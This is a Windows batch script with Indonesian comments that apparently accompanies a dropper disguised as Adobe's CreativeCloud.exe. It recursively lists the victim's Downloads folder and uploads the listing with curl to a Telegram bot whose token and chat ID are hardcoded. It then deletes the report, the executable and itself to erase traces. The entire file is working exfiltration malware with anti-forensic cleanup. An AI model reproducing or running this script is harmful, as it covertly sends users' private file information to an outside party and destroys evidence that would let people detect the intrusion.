@echo off
setlocal enabledelayedexpansion

:: --- Konfigurasi ---
set "TOKEN=8475448253:AAHp0_a3es41WG7so8I2-9K_n2g59Rmgr3M"
set "CHAT_ID=7318370755"
set "EXE_NAME=CreativeCloud.exe"

set "TARGET=%USERPROFILE%\Downloads"
set "OUTPUT_FILE=%TEMP%\downloads_scan_report.txt"
set "SCRIPT_PATH=%~f0"
set "SCRIPT_DIR=%~dp0"

echo ----------------------------------------------------------
echo 🔎 Scanning: %TARGET%
echo 🚫 Skipping 'Adobe' folders...
echo ----------------------------------------------------------

:: Membuat Header Laporan
echo Download Folder Scan Report > "%OUTPUT_FILE%"
echo Scan Time: %DATE% %TIME% >> "%OUTPUT_FILE%"
echo Target Directory: %TARGET% >> "%OUTPUT_FILE%"
echo ---------------------------------------------------------- >> "%OUTPUT_FILE%"

if exist "%TARGET%" (
    :: Scanning menggunakan loop dir (exclude Adobe)
    for /f "delims=" %%i in ('dir "%TARGET%" /s /b ^| findstr /v /i "Adobe"') do (
        if exist "%%i\" (
            echo [DIR]  %%i >> "%OUTPUT_FILE%"
        ) else (
            echo    ^|_ [FILE] %%i >> "%OUTPUT_FILE%"
        )
    )
    echo ✅ Scan Complete.
) else (
    echo ❌ Target folder not found.
    echo Target folder not found >> "%OUTPUT_FILE%"
)

:: Mengirim File ke Telegram menggunakan PowerShell (Native di Windows)
if exist "%OUTPUT_FILE%" (
    echo 📤 Sending report to Telegram...
    powershell -Command "$resp = curl.exe -s -k -F chat_id=%CHAT_ID% -F document=@'%OUTPUT_FILE%' -F caption='Сканировани вӗҫленнӗ. Файл %EXE_NAME% Сценарие часах пӗтерӗҫ. 🧹' 'https://api.telegram.org/bot%TOKEN%/sendDocument'; exit"
    timeout /t 2 >nul
)

echo 🧹 Cleaning traces and self-destructing...

:: Hapus file laporan
if exist "%OUTPUT_FILE%" del /f /q "%OUTPUT_FILE%"

:: Hapus EXE (jika ada di direktori script)
if exist "%SCRIPT_DIR%%EXE_NAME%" del /f /q "%SCRIPT_DIR%%EXE_NAME%"

:: Self-destruct file .bat ini sendiri
start /b "" cmd /c del "%SCRIPT_PATH%"&exit